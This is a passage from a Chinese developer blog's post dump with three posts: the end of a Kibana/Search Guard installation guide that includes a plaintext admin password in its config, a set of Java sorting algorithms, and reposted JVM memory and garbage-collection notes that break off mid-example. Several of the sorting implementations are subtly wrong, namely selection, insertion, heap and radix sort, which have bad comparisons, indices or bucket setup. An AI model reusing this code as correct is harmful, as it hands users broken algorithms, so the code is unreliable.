kibana:7.2.0 0x4.3安装插件 12cd /usr/share/kibana/bin./kibana-plugin install https://search.maven.org/remotecontent?filepath=com/floragunn/search-guard-kibana-plugin/7.2.0-35.2.0/search-guard-kibana-plugin-7.2.0-35.2.0.zip 具体插件版本地址地址可到插件下载0x4.4修改配置文件 1234567891011121314151617vi config/kibana.ymlserver.name: kibanaserver.host: \"0\"elasticsearch.hosts: [ \"https://elasticsearch:9200\" ]elasticsearch.username: \"admin\"elasticsearch.password: \"ipsearch12#\"elasticsearch.ssl.verificationMode: noneelasticsearch.requestHeadersWhitelist: [ \"Authorization\", \"sgtenant\" ]xpack.monitoring.enabled: falsexpack.graph.enabled: falsexpack.ml.enabled: falsexpack.watcher.enabled: falsexpack.security.enabled: falsexpack.monitoring.ui.container.elasticsearch.enabled: true 重启kibana 0x5安装head插件使用注意点使用elasticsearch做分页查询时，当查询记录超过10000时，会报如下错误： 123456PUT sec/_settings&#123; \"index\":&#123; \"max_result_window\":1000000 &#125;&#125; 参考文章:search-guard的官方文档https://docs.search-guard.com/latest/ CentOS 7 安装 JAVA环境(JDK1.8) https://juejin.im/entry/5b9b7c71e51d450e4115373d search-guard安装教程https://www.jianshu.com/p/fbc1763ff520","categories":[{"name":"开发","slug":"开发","permalink":"https://blog.cfyqy.com/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"数据检索","slug":"数据检索","permalink":"https://blog.cfyqy.com/tags/%E6%95%B0%E6%8D%AE%E6%A3%80%E7%B4%A2/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://blog.cfyqy.com/tags/elasticsearch/"}],"author":"ye1s"},{"title":"java排序算法","slug":"va排序算法","date":"2019-06-28T14:42:50.000Z","updated":"2020-04-13T08:01:10.000Z","comments":true,"path":"article/12345678.html","link":"","permalink":"https://blog.cfyqy.com/article/12345678.html","excerpt":"冒泡排序法","text":"冒泡排序法 详情可看此文章https://www.cnblogs.com/guoyaohua/p/8600214.html 算法总结: 算法分类: 0x1冒泡排序法12345678910111213141516public class BubbleSort &#123; public static void sort(int[] array) &#123; if(array.length==0) &#123; return ; &#125; for(int i=0;i&lt;array.length;i++) &#123; for(int j=0;j&lt;array.length-i-1;j++) &#123; if(array[j+1]&lt;array[j]) &#123; int temp=array[j+1]; array[j+1]=array[j]; array[j]=temp; &#125; &#125; &#125; &#125;&#125; 0x2选择排序12345678910111213141516171819public class Selection &#123; public static void sort(int[] nums) &#123; int N=nums.length; for(int i=0;i&lt;N;i++) &#123; int min=i; for(int j=i+1;j&lt;N;j++) &#123; if(nums[i]&gt;nums[j]) &#123; min=j; &#125; &#125; int temp=nums[i]; nums[i]=nums[min]; nums[min]=temp; &#125; &#125;&#125; 0x3插入排序12345678910111213141516171819public class Insertion &#123; public static void sort(int[] array) &#123; if(array.length==0) &#123; return ; &#125; for(int i=0;i&lt;array.length-1;i++) &#123; int current=array[i+1]; int preindex=i; while(preindex&gt;=0&amp;&amp;current&gt;array[preindex]) &#123; array[preindex+1]=array[preindex]; preindex--; &#125; array[preindex]=current; &#125; &#125;&#125; 0x4希尔排序1234567891011121314151617181920public class Shell &#123; public static void sort(int[] array) &#123; int len=array.length; int gap=len/2; while(gap&gt;0) &#123; for(int i=gap;i&lt;len;i++) &#123; int temp=array[i]; int preindex=i-gap; while(preindex&gt;=0&amp;&amp;temp&lt;array[preindex]) &#123; array[preindex+gap]=array[preindex]; preindex-=gap; &#125; array[preindex+gap]=temp; &#125; gap=gap/2; &#125; &#125;&#125; 0x5归并排序12345678910111213141516171819202122232425262728293031public class Merge &#123; public static int[] sort(int[] array) &#123; if(array.length&lt;2) &#123; return array; &#125; int mid=array.length/2; int[] left=Arrays.copyOfRange(array, 0, mid); int[] right=Arrays.copyOfRange(array, mid, array.length); return merge(sort(left),sort(right)); &#125; public static int[] merge(int[] left,int[] right) &#123; int[] result=new int[left.length+right.length]; for(int index=0,i=0,j=0;index&lt;result.length;index++) &#123; if(i&gt;=left.length) &#123; result[index]=right[j++]; &#125;else if(j&gt;=right.length)&#123; result[index]=left[i++]; &#125;else if(left[i]&gt;right[j]) &#123; result[index]=right[j++]; &#125;else &#123; result[index]=left[i++]; &#125; &#125; return result; &#125;&#125; 0x6快速排序1234567891011121314151617181920212223242526272829303132public class Quick &#123; public static int[] sort(int[] array,int start,int end) &#123; if(array.length&lt;1||start&lt;0||end&gt;=array.length||start&gt;end) return null; int smallIndex=partition(array,start,end); if(smallIndex&gt;start) sort(array,start,smallIndex-1); if(smallIndex&lt;end) sort(array,smallIndex+1,end); return array; &#125; public static int partition(int[] array,int start ,int end) &#123; int pivot=(int)(start+Math.random()*(end-start+1)); int smallIndex=start-1; swap(array,pivot,end); for(int i=start;i&lt;=end;i++) &#123; if(array[i]&lt;=array[end]) &#123; smallIndex++; if(i&gt;smallIndex) swap(array,i,smallIndex); &#125; &#125; return smallIndex; &#125; public static void swap(int[] array, int i, int j) &#123; int temp = array[i]; array[i] = array[j]; array[j] = temp; &#125;&#125; 0x7堆排序1234567891011121314151617181920212223242526272829303132333435363738394041424344public class Heap &#123; static int len; public static int[] sort(int[] array) &#123; len=array.length; if(len&lt;1) return array; //2.循环将堆首位（最大值）与末位交换，然后在重新调整最大堆 buildMaxHeap(array); while(len&gt;0) &#123; swap(array,0,len-1); len--; adjustHeap(array,0); &#125; return array; &#125; public static void buildMaxHeap(int[] array) &#123; //从最后一个非叶子节点开始向上构造最大堆 for (int i = (len/2 - 1); i &gt;= 0; i--) &#123; //感谢 @让我发会呆 网友的提醒，此处应该为 i = (len/2 - 1) adjustHeap(array, i); &#125; &#125; public static void adjustHeap(int[] array, int i) &#123; int maxIndex = i; //如果有左子树，且左子树大于父节点，则将最大指针指向左子树 if (i * 2 &lt; len &amp;&amp; array[i * 2] &gt; array[maxIndex]) maxIndex = i * 2; //如果有右子树，且右子树大于父节点，则将最大指针指向右子树 if (i * 2 + 1 &lt; len &amp;&amp; array[i * 2 + 1] &gt; array[maxIndex]) maxIndex = i * 2 + 1; //如果父节点不是最大值，则将父节点与最大值交换，并且递归调整与父节点交换的位置。 if (maxIndex != i) &#123; swap(array, maxIndex, i); adjustHeap(array, maxIndex); &#125; &#125; public static void swap(int[] array, int i,int j) &#123; int temp=array[i]; array[i]=array[j]; array[j]=temp; &#125;&#125; 0x8计数排序1234567891011121314151617181920212223242526272829303132333435import java.util.Arrays;public class Counting &#123; public static void sort(int[] array) &#123; if(array.length&lt;1) &#123; return; &#125; int min = array[0],max = array[0],bias; for(int i=0;i&lt;array.length;i++) &#123; if(min&gt;array[i]) min=array[i]; if(max&lt;array[i]) max=array[i]; &#125; bias=min; int[] bucket=new int[max-min+1]; Arrays.fill(bucket, 0); for(int i=0;i&lt;array.length;i++) &#123; bucket[array[i]-bias]++; &#125; int index=0,i=0; while(index&lt;array.length) &#123; if(bucket[i]!=0) &#123; array[index]=i+bias; bucket[i]--; index++; &#125;else &#123; i++; &#125; &#125; &#125;&#125; 0x9桶排序12345678910111213141516171819202122232425262728293031323334public static ArrayList&lt;Integer&gt; BucketSort(ArrayList&lt;Integer&gt; array, int bucketSize) &#123; if (array == null || array.size() &lt; 2) return array; int max = array.get(0), min = array.get(0); // 找到最大值最小值 for (int i = 0; i &lt; array.size(); i++) &#123; if (array.get(i) &gt; max) max = array.get(i); if (array.get(i) &lt; min) min = array.get(i); &#125; int bucketCount = (max - min) / bucketSize + 1; ArrayList&lt;ArrayList&lt;Integer&gt;&gt; bucketArr = new ArrayList&lt;&gt;(bucketCount); ArrayList&lt;Integer&gt; resultArr = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; bucketCount; i++) &#123; bucketArr.add(new ArrayList&lt;Integer&gt;()); &#125; for (int i = 0; i &lt; array.size(); i++) &#123; bucketArr.get((array.get(i) - min) / bucketSize).add(array.get(i)); &#125; for (int i = 0; i &lt; bucketCount; i++) &#123; if (bucketSize == 1) &#123; // 如果带排序数组中有重复数字时 感谢 @见风任然是风 朋友指出错误 for (int j = 0; j &lt; bucketArr.get(i).size(); j++) resultArr.add(bucketArr.get(i).get(j)); &#125; else &#123; if (bucketCount == 1) bucketSize--; ArrayList&lt;Integer&gt; temp = BucketSort(bucketArr.get(i), bucketSize); for (int j = 0; j &lt; temp.size(); j++) resultArr.add(temp.get(j)); &#125; &#125; return resultArr; &#125; 0x10基数排序1234567891011121314151617181920212223242526272829303132import java.util.ArrayList;public class Radix &#123; public static void RadixSort(int[] array) &#123; if(array==null||array.length&lt;2) return; int max=array[0]; for(int i=0;i&lt;array.length;i++) &#123; max=Math.max(max, array[i]); &#125; int maxDigit=0; while(max!=0) &#123; max/=10; maxDigit++; &#125; int mod=10,div=1; ArrayList&lt;ArrayList&lt;Integer&gt;&gt; bucketList=new ArrayList&lt;ArrayList&lt;Integer&gt;&gt;(); for(int i=0;i&lt;maxDigit;i++,mod*=10,div*=10) &#123; for(int j=0;j&lt;array.length;j++) &#123; int num=(array[j]%mod)/div; bucketList.get(num).add(array[j]); &#125; &#125; int index=0; for(int j=0;j&lt;bucketList.size();j++) &#123; for(int k=0;k&lt;bucketList.get(j).size();k++) &#123; array[index++]=bucketList.get(j).get(k); &#125; bucketList.get(j).clear(); &#125; &#125;&#125; 参考文章:十大经典排序算法最强总结","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"java","slug":"java","permalink":"https://blog.cfyqy.com/tags/java/"},{"name":"排序算法","slug":"排序算法","permalink":"https://blog.cfyqy.com/tags/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"}],"author":"ye1s"},{"title":"java虚拟机","slug":"Java 虚拟机","date":"2019-06-25T04:32:00.000Z","updated":"2020-04-13T08:02:13.000Z","comments":true,"path":"article/b8b03ac2.html","link":"","permalink":"https://blog.cfyqy.com/article/b8b03ac2.html","excerpt":"java虚拟机","text":"java虚拟机 转载https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md 本文大部分内容参考 周志明《深入理解 Java 虚拟机》 ，想要深入学习的话请看原书。 0x1运行时数据区域 0x1.1程序计数器记录正在执行的虚拟机字节码指令的地址（如果正在执行的是本地方法则为空）。 0x1.2Java 虚拟机栈每个 Java 方法在执行的同时会创建一个栈帧用于存储局部变量表、操作数栈、常量池引用等信息。从方法调用直至执行完成的过程，对应着一个栈帧在 Java 虚拟机栈中入栈和出栈的过程。 可以通过 -Xss 这个虚拟机参数来指定每个线程的 Java 虚拟机栈内存大小，在 JDK 1.4 中默认为 256K，而在 JDK 1.5+ 默认为 1M： 1java -Xss2M HackTheJava 该区域可能抛出以下异常： 当线程请求的栈深度超过最大值，会抛出 StackOverflowError 异常； 栈进行动态扩展时如果无法申请到足够内存，会抛出 OutOfMemoryError 异常。 0x1.3本地方法栈本地方法栈与 Java 虚拟机栈类似，它们之间的区别只不过是本地方法栈为本地方法服务。 本地方法一般是用其它语言（C、C++ 或汇编语言等）编写的，并且被编译为基于本机硬件和操作系统的程序，对待这些方法需要特别处理。 0x1.4堆所有对象都在这里分配内存，是垃圾收集的主要区域（”GC 堆”）。 现代的垃圾收集器基本都是采用分代收集算法，其主要的思想是针对不同类型的对象采取不同的垃圾回收算法。可以将堆分成两块： 新生代（Young Generation） 老年代（Old Generation） 堆不需要连续内存，并且可以动态增加其内存，增加失败会抛出 OutOfMemoryError 异常。 可以通过 -Xms 和 -Xmx 这两个虚拟机参数来指定一个程序的堆内存大小，第一个参数设置初始值，第二个参数设置最大值。 1java -Xms1M -Xmx2M HackTheJava 0x1.5方法区用于存放已被加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。 和堆一样不需要连续的内存，并且可以动态扩展，动态扩展失败一样会抛出 OutOfMemoryError 异常。 对这块区域进行垃圾回收的主要目标是对常量池的回收和对类的卸载，但是一般比较难实现。 HotSpot 虚拟机把它当成永久代来进行垃圾回收。但很难确定永久代的大小，因为它受到很多因素影响，并且每次 Full GC 之后永久代的大小都会改变，所以经常会抛出 OutOfMemoryError 异常。为了更容易管理方法区，从 JDK 1.8 开始，移除永久代，并把方法区移至元空间，它位于本地内存中，而不是虚拟机内存中。 方法区是一个 JVM 规范，永久代与元空间都是其一种实现方式。在 JDK 1.8 之后，原来永久代的数据被分到了堆和元空间中。元空间存储类的元信息，静态变量和常量池等放入堆中。 0x1.6运行时常量池运行时常量池是方法区的一部分。 Class 文件中的常量池（编译器生成的字面量和符号引用）会在类加载后被放入这个区域。 除了在编译期生成的常量，还允许动态生成，例如 String 类的 intern()。 0x1.7直接内存在 JDK 1.4 中新引入了 NIO 类，它可以使用 Native 函数库直接分配堆外内存，然后通过 Java 堆里的 DirectByteBuffer 对象作为这块内存的引用进行操作。这样能在一些场景中显著提高性能，因为避免了在堆内存和堆外内存来回拷贝数据。 0x2垃圾收集垃圾收集主要是针对堆和方法区进行。程序计数器、虚拟机栈和本地方法栈这三个区域属于线程私有的，只存在于线程的生命周期内，线程结束之后就会消失，因此不需要对这三个区域进行垃圾回收。 0x2.1判断一个对象是否可被回收0x2.1.1. 引用计数算法为对象添加一个引用计数器，当对象增加一个引用时计数器加 1，引用失效时计数器减 1。引用计数为 0 的对象可被回收。 在两个对象出现循环引用的情况下，此时引用计数器永远不为 0，导致无法对它们进行回收。正是因为循环引用的存在，因此 Java 虚拟机不使用引用计数算法。 1234567891011121314public class Test &#123; public Object instance = null; public static void main(String[] args) &#123; Test a = new Test(); Test b = new Test(); a.instance = b; b.instance = a; a = null; b = null; doSomething(); &#125;&#125; 在上述代码中，a 与 b 引用的对象实例互相持有了对象的引用，因此当我们把对 a 对象与 b 对象的引用去除之后，由于两个对象还存在互相之间的引用，导致两个 Test 对象无法被回收。 0x2.1.2. 可达性分析算法以 GC Roots 为起始点进行搜索，可达的对象都是存活的，不可达的对象可被回收。 Java 虚拟机使用该算法来判断对象是否可被回收，GC Roots 一般包含以下内容： 虚拟机栈中局部变量表中引用的对象 本地方法栈中 JNI 中引用的对象 方法区中类静态属性引用的对象 方法区中的常量引用的对象 0x2.1.3. 方法区的回收因为方法区主要存放永久代对象，而永久代对象的回收率比新生代低很多，所以在方法区上进行回收性价比不高。 主要是对常量池的回收和对类的卸载。 为了避免内存溢出，在大量使用反射和动态代理的场景都需要虚拟机具备类卸载功能。 类的卸载条件很多，需要满足以下三个条件，并且满足了条件也不一定会被卸载： 该类所有的实例都已经被回收，此时堆中不存在该类的任何实例。 加载该类的 ClassLoader 已经被回收。 该类对应的 Class 对象没有在任何地方被引用，也就无法在任何地方通过反射访问该类方法。 0x2.1.4. finalize()类似 C++ 的析构函数，用于关闭外部资源。但是 try-finally 等方式可以做得更好，并且该方法运行代价很高，不确定性大，无法保证各个对象的调用顺序，因此最好不要使用。 当一个对象可被回收时，如果需要执行该对象的 finalize() 方法，那么就有可能在该方法中让对象重新被引用，从而实现自救。自救只能进行一次，如果回收的对象之前调用了 finalize() 方法自救，后面回收时不会再调用该方法。 0x2.2.引用类型无论是通过引用计数算法判断对象的引用数量，还是通过可达性分析算法判断对象是否可达，判定对象是否可被回收都与引用有关。 Java 提供了四种强度不同的引用类型。 0x2.2.1. 强引用被强引用关联的对象不会被回收。 使用 new 一个新对象的方式来创建强引用。 1Object obj = new Object(); 0x2.2.2. 软引用被软引用关联的对象只有在内存不够的情况下才会被回收。 使用 SoftReference 类来创建软引用。 123Object obj = new Object();SoftReference&lt;Object&gt; sf = new SoftReference&lt;Object&gt;(obj);obj = null; // 使对象只被软引用关联 0x2.2.3. 弱引用被弱引用关联的对象一定会被回收，也就是说它只能存活到下一次垃圾回收发生之前。 使用 WeakReference 类来创建弱引用。 123Object obj = new Object();WeakReference&lt;Object&gt; wf = new WeakReference&lt;Object&gt;(obj);obj = null; 0x2.2.4. 虚引用又称为幽灵引用或者幻影引用，一个对象是否有虚引用的存在，不会对其生存时间造成影响，也无法通过虚引用得到一个对象。 为一个对象设置虚引用的唯一目的是能在这个对象被回收时收到一个系统通知。 使用 PhantomReference 来创建虚引用。 123Object obj = new Object();PhantomReference&lt;Object&gt; pf = new PhantomReference&lt;Object&gt;(obj, null);obj = null; 0x2.3.垃圾收集算法0x2.3.1. 标记 - 清除 在标记阶段，程序会检查每个对象是否为活动对象，如果是活动对象，则程序会在对象头部打上标记。 在清除阶段，会进行对象回收并取消标志位，另外，还会判断回收后的分块与前一个空闲分块是否连续，若连续，会合并这两个分块。回收对象就是把对象作为分块，连接到被称为 “空闲链表” 的单向链表，之后进行分配时只需要遍历这个空闲链表，就可以找到分块。 在分配时，程序会搜索空闲链表寻找空间大于等于新对象大小 size 的块 block。如果它找到的块等于 size，会直接返回这个分块；如果找到的块大于 size，会将块分割成大小为 size 与 (block - size) 的两部分，返回大小为 size 的分块，并把大小为 (block - size) 的块返回给空闲链表。 不足： 标记和清除过程效率都不高； 会产生大量不连续的内存碎片，导致无法给大对象分配内存。 0x2.3.2. 标记 - 整理 让所有存活的对象都向一端移动，然后直接清理掉端边界以外的内存。 优点: 不会产生内存碎片 不足: 需要移动大量对象，处理效率比较低。 0x2.3.3. 复制 将内存划分为大小相等的两块，每次只使用其中一块，当这一块内存用完了就将还存活的对象复制到另一块上面，然后再把使用过的内存空间进行一次清理。 主要不足是只使用了内存的一半。 现在的商业虚拟机都采用这种收集算法回收新生代，但是并不是划分为大小相等的两块，而是一块较大的 Eden 空间和两块较小的 Survivor 空间，每次使用 Eden 和其中一块 Survivor。在回收时，将 Eden 和 Survivor 中还存活着的对象全部复制到另一块 Survivor 上，最后清理 Eden 和使用过的那一块 Survivor。 HotSpot 虚拟机的 Eden 和 Survivor 大小比例默认为 8:1，保证了内存的利用率达到 90%。如果每次回收有多于 10% 的对象存活，那么一块 Survivor 就不够用了，此时需要依赖于老年代进行空间分配担保，也就是借用老年代的空间存储放不下的对象。 0x2.3.4. 分代收集现在的商业虚拟机采用分代收集算法，它根据对象存活周期将内存划分为几块，不同块采用适当的收集算法。 一般将堆分为新生代和老年代。 新生代使用：复制算法 老年代使用：标记 - 清除 或者 标记 - 整理 算法 0x2.5.垃圾收集器 以上是 HotSpot 虚拟机中的 7 个垃圾收集器，连线表示垃圾收集器可以配合使用。 单线程与多线程：单线程指的是垃圾收集器只使用一个线程，而多线程使用多个线程； 串行与并行：串行指的是垃圾收集器与用户程序交替执行，这意味着在执行垃圾收集的时候需要停顿用户程序；并行指的是垃圾收集器和用户程序同时执行。除了 CMS 和 G1 之外，其它垃圾收集器都是以串行的方式执行。 0x2.5.1. Serial 收集器Serial 翻译为串行，也就是说它以串行的方式执行。 它是单线程的收集器，只会使用一个线程进行垃圾收集工作。 它的优点是简单高效，在单个 CPU 环境下，由于没有线程交互的开销，因此拥有最高的单线程收集效率。 它是 Client 场景下的默认新生代收集器，因为在该场景下内存一般来说不会很大。它收集一两百兆垃圾的停顿时间可以控制在一百多毫秒以内，只要不是太频繁，这点停顿时间是可以接受的。 0x2.5.2. ParNew 收集器 它是 Serial 收集器的多线程版本。 它是 Server 场景下默认的新生代收集器，除了性能原因外，主要是因为除了 Serial 收集器，只有它能与 CMS 收集器配合使用。 0x2.5.3. Parallel Scavenge 收集器与 ParNew 一样是多线程收集器。 其它收集器目标是尽可能缩短垃圾收集时用户线程的停顿时间，而它的目标是达到一个可控制的吞吐量，因此它被称为“吞吐量优先”收集器。这里的吞吐量指 CPU 用于运行用户程序的时间占总时间的比值。 停顿时间越短就越适合需要与用户交互的程序，良好的响应速度能提升用户体验。而高吞吐量则可以高效率地利用 CPU 时间，尽快完成程序的运算任务，适合在后台运算而不需要太多交互的任务。 缩短停顿时间是以牺牲吞吐量和新生代空间来换取的：新生代空间变小，垃圾回收变得频繁，导致吞吐量下降。 可以通过一个开关参数打开 GC 自适应的调节策略（GC Ergonomics），就不需要手工指定新生代的大小（-Xmn）、Eden 和 Survivor 区的比例、晋升老年代对象年龄等细节参数了。虚拟机会根据当前系统的运行情况收集性能监控信息，动态调整这些参数以提供最合适的停顿时间或者最大的吞吐量。 0x2.5.4. Serial Old 收集器 是 Serial 收集器的老年代版本，也是给 Client 场景下的虚拟机使用。如果用在 Server 场景下，它有两大用途： 在 JDK 1.5 以及之前版本（Parallel Old 诞生以前）中与 Parallel Scavenge 收集器搭配使用。 作为 CMS 收集器的后备预案，在并发收集发生 Concurrent Mode Failure 时使用。 0x2.5.5. Parallel Old 收集器 是 Parallel Scavenge 收集器的老年代版本。 在注重吞吐量以及 CPU 资源敏感的场合，都可以优先考虑 Parallel Scavenge 加 Parallel Old 收集器。 0x2.5.6. CMS 收集器 CMS（Concurrent Mark Sweep），Mark Sweep 指的是标记 - 清除算法。 分为以下四个流程： 初始标记：仅仅只是标记一下 GC Roots 能直接关联到的对象，速度很快，需要停顿。 并发标记：进行 GC Roots Tracing 的过程，它在整个回收过程中耗时最长，不需要停顿。 重新标记：为了修正并发标记期间因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录，需要停顿。 并发清除：不需要停顿。 在整个过程中耗时最长的并发标记和并发清除过程中，收集器线程都可以与用户线程一起工作，不需要进行停顿。 具有以下缺点： 吞吐量低：低停顿时间是以牺牲吞吐量为代价的，导致 CPU 利用率不够高。 无法处理浮动垃圾，可能出现 Concurrent Mode Failure。浮动垃圾是指并发清除阶段由于用户线程继续运行而产生的垃圾，这部分垃圾只能到下一次 GC 时才能进行回收。由于浮动垃圾的存在，因此需要预留出一部分内存，意味着 CMS 收集不能像其它收集器那样等待老年代快满的时候再回收。如果预留的内存不够存放浮动垃圾，就会出现 Concurrent Mode Failure，这时虚拟机将临时启用 Serial Old 来替代 CMS。 标记 - 清除算法导致的空间碎片，往往出现老年代空间剩余，但无法找到足够大连续空间来分配当前对象，不得不提前触发一次 Full GC。 0x2.5.7. G1 收集器G1（Garbage-First），它是一款面向服务端应用的垃圾收集器，在多 CPU 和大内存的场景下有很好的性能。HotSpot 开发团队赋予它的使命是未来可以替换掉 CMS 收集器。 堆被分为新生代和老年代，其它收集器进行收集的范围都是整个新生代或者老年代，而 G1 可以直接对新生代和老年代一起回收。 G1 把堆划分成多个大小相等的独立区域（Region），新生代和老年代不再物理隔离。 通过引入 Region 的概念，从而将原来的一整块内存空间划分成多个的小空间，使得每个小空间可以单独进行垃圾回收。这种划分方法带来了很大的灵活性，使得可预测的停顿时间模型成为可能。通过记录每个 Region 垃圾回收时间以及回收所获得的空间（这两个值是通过过去回收的经验获得），并维护一个优先列表，每次根据允许的收集时间，优先回收价值最大的 Region。 每个 Region 都有一个 Remembered Set，用来记录该 Region 对象的引用对象所在的 Region。通过使用 Remembered Set，在做可达性分析的时候就可以避免全堆扫描。 如果不计算维护 Remembered Set 的操作，G1 收集器的运作大致可划分为以下几个步骤： 初始标记 并发标记 最终标记：为了修正在并发标记期间因用户程序继续运作而导致标记产生变动的那一部分标记记录，虚拟机将这段时间对象变化记录在线程的 Remembered Set Logs 里面，最终标记阶段需要把 Remembered Set Logs 的数据合并到 Remembered Set 中。这阶段需要停顿线程，但是可并行执行。 筛选回收：首先对各个 Region 中的回收价值和成本进行排序，根据用户所期望的 GC 停顿时间来制定回收计划。此阶段其实也可以做到与用户程序一起并发执行，但是因为只回收一部分 Region，时间是用户可控制的，而且停顿用户线程将大幅度提高收集效率。 具备如下特点： 空间整合：整体来看是基于“标记 - 整理”算法实现的收集器，从局部（两个 Region 之间）上来看是基于“复制”算法实现的，这意味着运行期间不会产生内存空间碎片。 可预测的停顿：能让使用者明确指定在一个长度为 M 毫秒的时间片段内，消耗在 GC 上的时间不得超过 N 毫秒。 0x3.内存分配与回收策略0x3.1Minor GC 和 Full GC Minor GC：回收新生代，因为新生代对象存活时间很短，因此 Minor GC 会频繁执行，执行的速度一般也会比较快。 Full GC：回收老年代和新生代，老年代对象其存活时间长，因此 Full GC 很少执行，执行速度会比 Minor GC 慢很多。 0x3.2内存分配策略0x3.2.1. 对象优先在 Eden 分配大多数情况下，对象在新生代 Eden 上分配，当 Eden 空间不够时，发起 Minor GC。 0x3.2.2. 大对象直接进入老年代大对象是指需要连续内存空间的对象，最典型的大对象是那种很长的字符串以及数组。 经常出现大对象会提前触发垃圾收集以获取足够的连续空间分配给大对象。 -XX:PretenureSizeThreshold，大于此值的对象直接在老年代分配，避免在 Eden 和 Survivor 之间的大量内存复制。 0x3.2.3. 长期存活的对象进入老年代为对象定义年龄计数器，对象在 Eden 出生并经过 Minor GC 依然存活，将移动到 Survivor 中，年龄就增加 1 岁，增加到一定年龄则移动到老年代中。 -XX:MaxTenuringThreshold 用来定义年龄的阈值。 0x3.2.4. 动态对象年龄判定虚拟机并不是永远要求对象的年龄必须达到 MaxTenuringThreshold 才能晋升老年代，如果在 Survivor 中相同年龄所有对象大小的总和大于 Survivor 空间的一半，则年龄大于或等于该年龄的对象可以直接进入老年代，无需等到 MaxTenuringThreshold 中要求的年龄。 0x3.2.5. 空间分配担保在发生 Minor GC 之前，虚拟机先检查老年代最大可用的连续空间是否大于新生代所有对象总空间，如果条件成立的话，那么 Minor GC 可以确认是安全的。 如果不成立的话虚拟机会查看 HandlePromotionFailure 的值是否允许担保失败，如果允许那么就会继续检查老年代最大可用的连续空间是否大于历次晋升到老年代对象的平均大小，如果大于，将尝试着进行一次 Minor GC；如果小于，或者 HandlePromotionFailure 的值不允许冒险，那么就要进行一次 Full GC。 0x3.3.Full GC 的触发条件对于 Minor GC，其触发条件非常简单，当 Eden 空间满时，就将触发一次 Minor GC。而 Full GC 则相对复杂，有以下条件： 0x3.3.1. 调用 System.gc()只是建议虚拟机执行 Full GC，但是虚拟机不一定真正去执行。不建议使用这种方式，而是让虚拟机管理内存。 0x3.3.2. 老年代空间不足老年代空间不足的常见场景为前文所讲的大对象直接进入老年代、长期存活的对象进入老年代等。 为了避免以上原因引起的 Full GC，应当尽量不要创建过大的对象以及数组。除此之外，可以通过 -Xmn 虚拟机参数调大新生代的大小，让对象尽量在新生代被回收掉，不进入老年代。还可以通过 -XX:MaxTenuringThreshold 调大对象进入老年代的年龄，让对象在新生代多存活一段时间。 0x3.3.3. 空间分配担保失败使用复制算法的 Minor GC 需要老年代的内存空间作担保，如果担保失败会执行一次 Full GC。具体内容请参考上面的第 5 小节。 0x3.3.4. JDK 1.7 及以前的永久代空间不足在 JDK 1.7 及以前，HotSpot 虚拟机中的方法区是用永久代实现的，永久代中存放的为一些 Class 的信息、常量、静态变量等数据。 当系统中要加载的类、反射的类和调用的方法较多时，永久代可能会被占满，在未配置为采用 CMS GC 的情况下也会执行 Full GC。如果经过 Full GC 仍然回收不了，那么虚拟机会抛出 java.lang.OutOfMemoryError。 为避免以上原因引起的 Full GC，可采用的方法为增大永久代空间或转为使用 CMS GC。 0x3.3.5. Concurrent Mode Failure执行 CMS GC 的过程中同时有对象要放入老年代，而此时老年代空间不足（可能是 GC 过程中浮动垃圾过多导致暂时性的空间不足），便会报 Concurrent Mode Failure 错误，并触发 Full GC。 0x4.类加载机制类是在运行期间第一次使用时动态加载的，而不是一次性加载所有类。因为如果一次性加载，那么会占用很多的内存。 0x4.1类的生命周期 包括以下 7 个阶段： 加载（Loading） 验证（Verification） 准备（Preparation） 解析（Resolution） 初始化（Initialization） 使用（Using） 卸载（Unloading） 0x4.2类加载过程包含了加载、验证、准备、解析和初始化这 5 个阶段。 0x4.2.1. 加载加载是类加载的一个阶段，注意不要混淆。 加载过程完成以下三件事： 通过类的完全限定名称获取定义该类的二进制字节流。 将该字节流表示的静态存储结构转换为方法区的运行时存储结构。 在内存中生成一个代表该类的 Class 对象，作为方法区中该类各种数据的访问入口。 其中二进制字节流可以从以下方式中获取： 从 ZIP 包读取，成为 JAR、EAR、WAR 格式的基础。 从网络中获取，最典型的应用是 Applet。 运行时计算生成，例如动态代理技术，在 java.lang.reflect.Proxy 使用 ProxyGenerator.generateProxyClass 的代理类的二进制字节流。 由其他文件生成，例如由 JSP 文件生成对应的 Class 类。 0x4.2.2. 验证确保 Class 文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。 0x4.2.3. 准备类变量是被 static 修饰的变量，准备阶段为类变量分配内存并设置初始值，使用的是方法区的内存。 实例变量不会在这阶段分配内存，它会在对象实例化时随着对象一起被分配在堆中。应该注意到，实例化不是类加载的一个过程，类加载发生在所有实例化操作之前，并且类加载只进行一次，实例化可以进行多次。 初始值一般为 0 值，例如下面的类变量 value 被初始化为 0 而不是 123。 1public static int value = 123; 如果类变量是常量，那么它将初始化为表达式所定义的值而不是 0。例如下面的常量 value 被初始化为 123 而不是 0。 1public static final int value = 123; 0x4.2.4. 解析将常量池的符号引用替换为直接引用的过程。 其中解析过程在某些情况下可以在初始化阶段之后再开始，这是为了支持 Java 的动态绑定。 0x4.2.5. 初始化 初始化阶段才真正开始执行类中定义的 Java 程序代码。初始化阶段是虚拟机执行类构造器 &lt;clinit&gt;() 方法的过程。在准备阶段，类变量已经赋过一次系统要求的初始值，而在初始化阶段，根据程序员通过程序制定的主观计划去初始化类变量和其它资源。 &lt;clinit&gt;() 是由编译器自动收集类中所有类变量的赋值动作和静态语句块中的语句合并产生的，编译器收集的顺序由语句在源文件中出现的顺序决定。特别注意的是，静态语句块只能访问到定义在它之前的类变量，定义在它之后的类变量只能赋值，不能访问。例如以下代码： 1234567public class Test &#123; static &#123; i = 0; // 给变量赋值可以正常编译通过 System.out.print(i); // 这句编译器会提示“非法向前引用” &#125; static int i = 1;&#125; 由于父类的 &lt;clinit&gt;() 方法先执行，也就意味着父类中定义的静态语句块的执行要优先于子类。例如以下代码： 1234567891011121314static class Parent &#123; public static int A = 1; static &#123; A = 2; &#125;&#125;static class Sub extends Parent &#123; public static int B = A;&#125;public static void main(String[] args) &#123; 